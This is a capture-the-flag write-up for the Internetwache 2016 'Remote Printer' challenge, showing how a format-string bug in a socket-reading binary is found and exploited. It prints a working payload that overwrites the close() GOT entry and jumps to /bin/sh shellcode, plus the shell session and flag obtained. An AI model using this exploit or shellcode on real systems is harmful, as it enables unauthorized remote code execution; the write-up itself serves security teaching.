{"pageContext":{"html":"<p><a href=\"ctf=internetwasche-ctf-2016\"></a>\n<a href=\"type=exploit\"></a>\n<a href=\"tags=format%20string\"></a>\n<a href=\"tools=libformatstr\"></a>\n<a href=\"techniques=format%20string\"></a></p>\n<h1>Remote Printer (exp-80)</h1>\n<blockquote>\n<p>Description: Printer are very very important for offices. Especially for remote printing. My boss told me to build a tool for that task.</p>\n</blockquote>\n<blockquote>\n<p>Attachment: exp80.zip</p>\n</blockquote>\n<blockquote>\n<p>Service: 188.166.133.53:12377</p>\n</blockquote>\n<p>Unzipping the <a href=\"../exp80.zip\">file</a> gives us the following.</p>\n<pre><code class=\"language-bash\">$ file RemotePrinter\nRemotePrinter: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3db29aea1dc4af0eb3f7104e529f856256a1d775, stripped\n</code></pre>\n<p>If we run it with</p>\n<pre><code class=\"language-bash\">$ nc -l -p 8000 -vv\n</code></pre>\n<p>in another terminal.</p>\n<pre><code class=\"language-bash\">$ ./RemotePrinter\nThis is a remote printer!\nEnter IPv4 address:127.0.0.1\nEnter port:8000\n</code></pre>\n<p>gives us a connection on the listening port.</p>\n<pre><code class=\"language-bash\">$ nc -l -p 8000 -vv\nlistening on [any] 8000 ...\nconnect to [127.0.0.1] from Hack-Machine [127.0.0.1] 38908\n%p.%p.%p\n sent 9, rcvd 0\n</code></pre>\n<pre><code class=\"language-bash\">$ ./RemotePrinter\nThis is a remote printer!\nEnter IPv4 address:127.0.0.1\nEnter port:8000\nThank you, I'm trying to print 127.0.0.1:8000 now!\n0xffc8425c.0x2000.(nil)\n</code></pre>\n<p>So yeah! Format string exploitation!</p>\n<p>A quick decompilation with <a href=\"https://www.hopperapp.com/\">Hopper</a> gives us</p>\n<pre><code class=\"language-c\">function sub_80486d5 {\n    eax = *stdout;\n    setbuf(eax, 0x0);\n    puts(\"This is a remote printer!\");\n    printf(\"Enter IPv4 address:\");\n    __isoc99_scanf(0x804896e, var_18);\n    printf(\"Enter port:\");\n    __isoc99_scanf(0x804897f, 0x0);\n    printf(\"Thank you, I'm trying to print %s:%d now!\\n\", var_18, 0x0);\n    esp = (((((((esp - 0x8 - 0x4 - 0x4) + 0x10 - 0xc - 0x4) + 0x10 - 0xc - 0x4) + 0x10 - 0x8 - 0x4 - 0x4) + 0x10 - 0xc - 0x4) + 0x10 - 0x8 - 0x4 - 0x4) + 0x10 - 0x4 - 0x4 - 0x4 - 0x4) + 0x10;\n    sub_8048786(var_18, 0x0);\n    return 0x0;\n}\nfunction sub_8048786 {\n    esp = (esp - 0x4 - 0x4 - 0x4 - 0x4) + 0x10;\n    var_C = socket(0x2, 0x1, 0x0);\n    if (var_C == 0xffffffff) {\n            puts(\"No socket :(\");\n    }\n    else {\n            inet_addr(arg0);\n            htons();\n            esp = (((esp - 0xc - 0x4) + 0x10 - 0xc - 0x4) + 0x10 - 0x4 - 0x4 - 0x4 - 0x4) + 0x10;\n            if (connect(var_C, 0x2, 0x10) &#x3C; 0x0) {\n                    perror(\"No communication :(\\n\");\n            }\n            else {\n                    esp = (esp - 0x4 - 0x4 - 0x4 - 0x4) + 0x10;\n                    if (recv(var_C, var_201C, 0x2000, 0x0) &#x3C; 0x0) {\n                            puts(\"No data :(\");\n                    }\n                    else {\n                            printf(var_201C);\n                            close(var_C);\n                    }\n            }\n    }\n    return;\n}\n</code></pre>\n<p>Lets checksec.</p>\n<pre><code class=\"language-bash\">$ gdb -q ./RemotePrinter\nReading symbols from ./RemotePrinter...(no debugging symbols found)...done.\ngdb-peda$ checksec\nCANARY    : disabled\nFORTIFY   : disabled\nNX        : disabled\nPIE       : disabled\nRELRO     : disabled\n</code></pre>\n<p>So NX is disabled. This means we can execute shellcode on the stack.</p>\n<p>So a brief strategy : By overwriting a GOT entry for a function the program will use after\nthe printf call we can seize control and\ncan jump to shellcode address.</p>\n<p>So here we see printf() is followed by close(). We'll patch the GOT entry for close() to execute our shellcode.</p>\n<pre><code class=\"language-bash\">$ readelf -r ./RemotePrinter\n\nRelocation section '.rel.dyn' at offset 0x408 contains 2 entries:\n Offset     Info    Type            Sym.Value  Sym. Name\n08049c34  00000806 R_386_GLOB_DAT    00000000   __gmon_start__\n08049c8c  00001105 R_386_COPY        08049c8c   stdout\n\nRelocation section '.rel.plt' at offset 0x418 contains 16 entries:\n Offset     Info    Type            Sym.Value  Sym. Name\n08049c44  00000107 R_386_JUMP_SLOT   00000000   setbuf\n08049c48  00000207 R_386_JUMP_SLOT   00000000   printf\n08049c4c  00000307 R_386_JUMP_SLOT   00000000   fgets\n08049c50  00000407 R_386_JUMP_SLOT   00000000   fclose\n08049c54  00000507 R_386_JUMP_SLOT   00000000   htons\n08049c58  00000607 R_386_JUMP_SLOT   00000000   perror\n08049c5c  00000707 R_386_JUMP_SLOT   00000000   puts\n08049c60  00000807 R_386_JUMP_SLOT   00000000   __gmon_start__\n08049c64  00000907 R_386_JUMP_SLOT   00000000   __libc_start_main\n08049c68  00000a07 R_386_JUMP_SLOT   00000000   fopen\n08049c6c  00000b07 R_386_JUMP_SLOT   00000000   __isoc99_scanf\n08049c70  00000c07 R_386_JUMP_SLOT   00000000   socket\n08049c74  00000d07 R_386_JUMP_SLOT   00000000   inet_addr\n08049c78  00000e07 R_386_JUMP_SLOT   00000000   connect\n08049c7c  00000f07 R_386_JUMP_SLOT   00000000   recv\n08049c80  00001007 R_386_JUMP_SLOT   00000000   close\n</code></pre>\n<p>First we need to locate our input on the stack. A little checking reveals that the first thing on the stack at printf() is the address of our input. Also we can see that ASLR is not enabled on the service as the address remains constant for 5-6 tries (0xffffbcec).</p>\n<p>The exploit is pretty straight-forward :</p>\n<pre><code class=\"language-python\">>>> from pwn import *\n>>> shell=\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n>>> from libformatstr import *\n>>> p=FormatStr()\n>>> p[0x08049c80]=0xffffbcec+0x30\n>>> pay=p.payload(7,0)\n>>> print repr(pay+'\\x90'*50+shell)\n'%48412c%14$hn%17123c%15$hnAA\\x80\\x9c\\x04\\x08\\x82\\x9c\\x04\\x08\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x901\\xc0Ph//shh/bin\\x89\\xe3PS\\x89\\xe1\\xb0\\x0b\\xcd\\x80'\n>>>\n</code></pre>\n<p>Now the exploit in action :</p>\n<pre><code class=\"language-bash\">$for i in {1..100}; do python -c \"print '%48412c%14\\$hn%17123c%15\\$hnAA\\x80\\x9c\\x04\\x08\\x82\\x9c\\x04\\x08\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x901\\xc0Ph//shh/bin\\x89\\xe3PS\\x89\\xe1\\xb0\\x0b\\xcd\\x80'\"| nc -vv -l -p 443 ; done\nListening on [0.0.0.0] (family 0, port 443)\nConnection from [178.62.254.108] port 443 [tcp/https] accepted (family 2, sport 34495)\n</code></pre>\n<p>we get a shell</p>\n<pre><code>id\nuid=1010(exp80) gid=1010(exp80) groups=1010(exp80)\nls\nRemotePrinter\nflag.txt\ncat flag.txt\nIW{YVO_F0RmaTt3d_RMT_Pr1nT3R}\nuname -a\nLinux serv1.2016.ctf.internetwache.org 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt20-1+deb8u3 (2016-01-17) x86_64 GNU/Linux\n</code></pre>\n<p>flag</p>\n<blockquote>\n<p>IW{YVO<em>F0RmaTt3d</em>RMT_Pr1nT3R}</p>\n</blockquote>"}}